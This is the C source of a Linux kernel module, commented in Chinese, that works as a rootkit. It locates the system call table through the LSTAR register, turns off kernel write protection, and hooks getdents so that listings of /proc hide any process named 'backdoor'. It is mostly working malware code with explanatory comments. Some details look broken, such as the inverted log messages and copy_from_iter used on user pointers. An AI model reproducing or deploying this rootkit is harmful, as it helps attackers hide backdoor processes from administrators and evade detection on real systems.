#include <linux/module.h>
#include <linux/kernel.h>
#include <asm/unistd.h>
#include <linux/types.h>
#include <linux/sched.h>
#include <linux/dirent.h>
#include <linux/string.h>
#include <linux/file.h>
#include <linux/fs.h>
#include <linux/list.h>
#include <asm/uaccess.h>
#include <linux/unistd.h>
#include <linux/slab.h>
#include <linux/init.h>   
#include <linux/stddef.h>     
#include <linux/mm.h>  
#include <linux/in.h>  
#include <asm/processor.h>  
#include <linux/proc_fs.h>

struct linux_dirent{  //目录文件（directory file）的概念：这种文件包含了其他文件的名字以及指向与这些文件有关的信息的指针
    unsigned long     d_ino;/* inode number 索引节点号 */  
    unsigned long     d_off;/* offset to this dirent 在目录文件中的偏移 */  
    unsigned short    d_reclen; /* length of this d_name 文件名长 */  
    char    d_name[1]; //目录下面项的名字，如果发现这个名字跟想要隐藏的名字相同，那么就不显示。&&&&&&&&
};

static unsigned long ** sys_call_table;

long (*old_getdents)(unsigned int fd, struct linux_dirent __user *dirp, unsigned int count); //声明一个指向old_getdents的指针

void disable_write_protection(void) //取消写保护
{
        unsigned long cr0 = read_cr0();
        clear_bit(16, &cr0);
        write_cr0(cr0);
}

void enable_write_protection(void) //恢复写保护
{
        unsigned long cr0 = read_cr0();
        set_bit(16, &cr0);
        write_cr0(cr0);
}

void  *get_lstar_sct_addr(void) //2
{
	u64 lstar;//system_call地址
	u64 index;

      //MSR 是CPU 的一组64 位寄存器，可以分别通过RDMSR 和WRMSR 两条指令进行读和写的操作，
      //MSR 总体来是为了设置CPU 的工作环境和标示CPU 的工作状态，包括温度控制，性能监控等，
	rdmsrl(MSR_LSTAR, lstar);//&&&&&&&&
	
	/*从0×80号中断的中断服务程序system_call的地址开始搜索硬编码 \xff\x14\x85，这块硬编码的后面紧接着就是系统调用表的地址，
	因为x86 call指令的二进制格式为\xff\x14\x85，而中断服务程序调用系统调用的语句是call sys_call_table(,eax,4)

	X86 64位系统上，这一过程发生了变化。注意Linux x86_64使用的LP64字长模式。
	Linux x86_64可以通过三种方式获取system_call表，Linux x86_64有两套调用模式：Long模式和兼容模式，对应有两套调用表：system_call，ia32_syscall.
     兼容方式 使用int 0x80, MSR寄存器地址为0xc0000083,宏MSR_CSTAR来代表. 使用sidt获取system_call地址
     Long方式 使用syscall, MSR寄存器地址为0xc0000082，用宏MSR_LSTAR来代表. 使用rdmsrl指令获取system_call地址
 */
	for (index = 0; index <= PAGE_SIZE; index += 1) { //PAGE_SIZE一页内存大小
		u8 *arr = (u8 *)lstar + index;   //u8 = unsigned char 占8位，1个字节
		//通过sys_call获取sys_call_table特征码
		if (arr[0] == 0xff && arr[1] == 0x14 && arr[2] == 0xc5) {
		    return arr + 3;
		}
	}

	return NULL;
}

unsigned long  **get_lstar_sct(void) //1
{
	unsigned long *lstar_sct_addr = get_lstar_sct_addr();//获得sct首地址
	if (lstar_sct_addr != NULL) {
		u64 base = 0xffffffff00000000;
		u32 code = *(u32 *)lstar_sct_addr; //先转成u32指针，再取出其中内容，即sct地址
		return (void *)(base | code);  //或运算，转成64位
	} else {
		return NULL;
	}                                         
}

int check_pid_Name(char *pid_name,int len) //4
{
	int m_flag = 0;
	struct file *fp;
	mm_segment_t fs;
	loff_t pos;
	char *buf1;
	char *t_pid_name;
	char * pro = "/proc/";
	char * statu = "/status";

	buf1 = (char *) kmalloc(64, GFP_KERNEL);
	t_pid_name = (char *) kmalloc(len + 14, GFP_KERNEL); // len+6+7+1,1 is '\0'

	memmove(t_pid_name, (char *) pro , 6);   //  /proc/pid name/status
	memmove(t_pid_name + 6, (char *) pid_name , len);
	memmove(t_pid_name + 6 + len, (char *) statu , 7);

	fp = filp_open(t_pid_name,O_RDONLY,0000);//proc/…/status文件的第一行就是进程名
	if (IS_ERR(fp)){
		printk("open file error/n");
		return -1;
	}

	fs = get_fs();//get_fs是取得当前的地址访问限制值
	set_fs(KERNEL_DS);//设置当前执行环境为kernel_ds，否则会出错
	//该函数的参数fs只有两个取值：USER_DS，KERNEL_DS，分别代表 用户空间和内核空间，
	//默认情况下，kernel取值为USER_DS，即对用户空间地址检查并做变换
	/*
	进程由用户态进入核态，linux进程的task_struct结构中的成员addr_limit也应该由0xBFFFFFFF变为0xFFFFFFFF
	(addr_limit规定了进程有用户态核内核态情况下的虚拟地址空间访问范围，在用户态，addr_limit成员值是
	0xBFFFFFFF也就是有3GB的虚拟内存空间，在核心态，是0xFFFFFFFF,范围扩展了1GB)。
	使用这三个函数是为了安全性。为了保证用户态的地址所指向空间有效，函数会做一些检查工作。 
	如果set_fs(KERNEL_DS),函数将跳过这些检查。
	*/
	pos = 0;
	vfs_read(fp, buf1, 64, &pos);
	//ssize_t vfs_read(struct file* filp, char __user* buffer, size_t len, loff_t* pos);
	//strstr(str1,str2) 函数用于判断字符串str2是否是str1的子串。如果是，则该函数返回str2在str1中首次出现的地址；否则，返回NULL。
	if (strstr(buf1,"backdoor") == NULL) //当前文件名未包含要隐藏的目标文件名，则置m_flag为1
	{
		//printk("find backdoor\n");
		m_flag = 1;
	}

	filp_close(fp,NULL);
	set_fs(fs);//恢复环境

	kfree(buf1);
	kfree(t_pid_name);
	return m_flag;
}


int is_int(char *str)//进程号长度 //5
{
	int str_len = 0;
	char *ptr;
	for (ptr = str + strlen(str) - 1; ptr >= str; ptr--)
	{
		if (*ptr >= '0' && *ptr <= '9')
			str_len = str_len + 1;
	}
	return (str_len);
}

asmlinkage long my_getdents(unsigned int fd, struct linux_dirent __user *dirp, unsigned int count) //3
{
	struct linux_dirent *td,*td1,*td2,*td3;  
	int number;
	int copy_len = 0;

	// 调用原始的系统调用，下面对返回结果进行过滤  
	number = (*old_getdents) (fd, dirp, count);  
	/*
	The system call getdents() reads several linux_dirent structures from
       the directory referred to by the open file descriptor fd into the
       buffer pointed to by dirp.  The argument count specifies the size of
       that buffer.
       返回值： On success, the number of bytes read is returned.  On end of
       directory, 0 is returned.  On error, -1 is returned, and errno is set appropriately.
	*/
	if (!number)  
		return (number);  

	// 分配内核空间，并把用户空间的数据拷贝到内核空间  
	td2 = (struct linux_dirent *) kmalloc(number, GFP_KERNEL);//td2未过滤数据
	td1 = (struct linux_dirent *) kmalloc(number, GFP_KERNEL);//td1已过滤数据
	td = td1;  //td指向td1头
	td3 = td2; //td3指向td2头
	/*
	unsigned long copy_from_iter(void *to, const void *from, unsigned long n);
	to:目标地址（内核空间）
	from:源地址（用户空间）
	n:将要拷贝数据的字节数
	返回：成功返回0，失败返回没有拷贝成功的数据字节数
	*/
	copy_from_iter(td2, dirp, number);  //从dirp拷贝到td2
	
	while(number>0){
		number = number - td2->d_reclen;//更新number

		if(check_pid_Name(td2->d_name,is_int(td2->d_name))){ //当前文件名未包含要隐藏的目标文件名，则拷贝到td1中
			printk("%s,find backdoor, hide it.\n",td2->d_name);
			memmove(td1, (char *) td2 , td2->d_reclen);
			/*
			void *memmove(void *s1,const void *s2,size_t n);
                      说明：函数memmove从s2指向的对象中复制n个字符到s1指向的对象中。
		      */
			td1 = (struct linux_dirent *) ((char *)td1 + td2->d_reclen);//调整td1指针位置
			copy_len = copy_len + td2->d_reclen;//更新过滤后数据长度
		}
		else
		{
			printk("%s, not find\n",td2->d_name);
		}
		

		td2 = (struct linux_dirent *) ((char *)td2 + td2->d_reclen);//调整td2指针位置
	}
	
	// 将过滤后的数据拷贝回用户空间
	copy_to_iter(dirp, td, copy_len);  
	kfree(td); 
	kfree(td3);
	return (copy_len);  
}

/*static int filter_init(void)
{   
	sys_call_table = get_lstar_sct();
	if (!sys_call_table)
	{
		return 0;
	}
	else{
		old_getdents = (void *)sys_call_table[__NR_getdents];
		disable_write_protection();
		sys_call_table[__NR_getdents] = (unsigned long *)&my_getdents;
		enable_write_protection();

		return 0;
	}   
}

static void filter_exit(void)
{
    disable_write_protection();
    sys_call_table[__NR_getdents] = (unsigned long *)old_getdents;
    enable_write_protection();
	return;
}
*/
int init_module()
{
	sys_call_table = get_lstar_sct();
	if (!sys_call_table)
	{
		return 0;
	}
	else{
		old_getdents = (void *)sys_call_table[__NR_getdents];
		disable_write_protection();
		sys_call_table[__NR_getdents] = (unsigned long *)&my_getdents;
		enable_write_protection();

		return 0;
	} 
}
void cleanup_module()
{
	disable_write_protection();
    sys_call_table[__NR_getdents] = (unsigned long *)old_getdents;
    enable_write_protection();
	return;
}
MODULE_LICENSE("GPL");
//module_init(filter_init);
//module_exit(filter_exit);